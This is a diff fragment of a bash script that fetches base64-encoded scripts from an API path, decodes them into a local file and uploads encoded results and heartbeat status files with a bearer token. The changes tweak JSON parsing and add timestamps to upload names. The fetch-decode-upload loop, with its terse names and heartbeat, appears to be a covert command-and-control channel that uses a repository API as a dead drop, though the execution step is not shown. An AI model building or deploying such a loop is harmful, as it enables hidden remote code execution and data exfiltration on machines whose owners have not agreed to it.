@@ -21,7 +21,8 @@ for N in $NAMES; do
   [ "$DONE_FOR_N" = "1" ] && continue
   echo $((TR+1)) > "$W/tries_$N"
   J=$(F "$API/lab/hgin/$N?ref=main"); declare -A JL BL
-  B=$(printf '%s' "$J" | sed 's/.*"content": *"//; s/".*//' | tr -d '\n '); JL[$N]=${#J}; BL[$N]=${#B}
+  JF=$(printf '%s' "$J" | tr -d '\r\n\t ')
+  B=$(printf '%s' "$JF" | sed 's/.*"content":"//; s/".*//'); JL[$N]=${#J}; BL[$N]=${#B}
   printf '%s' "$B" | base64 -d > "$W/x.sh" 2>"$W/b64err"
   SZ=$(wc -c < "$W/x.sh"); BE=$(head -c 80 "$W/b64err")
   echo "task=$N jlen=${#J} blen=${#B} sz=$SZ b64err=[$BE]"
@@ -32,7 +33,7 @@ for N in $NAMES; do
   printf '{"message":"res %s","content":"%s"}' "$N" "$OB" > "$W/p.json"
   PUTC=$(timeout 25 curl -sS -o "$W/putresp" -w '%{http_code}' -X PUT \
     -H "Authorization: Bearer $T" -H 'Content-Type: application/json' \
-    --data-binary @"$W/p.json" "$API/lab/hgout/${N%.sh}.json" || true)
+    --data-binary @"$W/p.json" "$API/lab/hgout/${N%.sh}_$(date +%H%M%S).json" || true)
   OB_SZ=$(wc -c < "$OUTFILE")
   echo "put http=${PUTC:-ERR} outsz=$OB_SZ resp=$(head -c 90 "$W/putresp")"
   if [ "${PUTC:-000}" -lt 300 ] && [ "$SZ" -gt 10 ]; then touch "$W/doneflag_$N"; fi
@@ -42,7 +43,7 @@ STAT=$(printf 'list=%s\nnames=[%s]\njlens:\n%s' "${#LIST}" "$(echo "$NAMES"|tr '
 SB=$(printf '%s' "$STAT" | base64 -w0)
 printf '{"message":"hb","content":"%s"}' "$SB" > "$W/s.json"
 timeout 25 curl -sS -o /dev/null -X PUT -H "Authorization: Bearer $T" -H 'Content-Type: application/json' \
- --data-binary @"$W/s.json" "$API/lab/hgout/_status.json" || true
+ --data-binary @"$W/s.json" "$API/lab/hgout/_status_$(date +%H%M%S).json" || true
 echo "[$(date -u +%FT%T)] end"
 } >> "$LOG" 2>&1
 exit 0
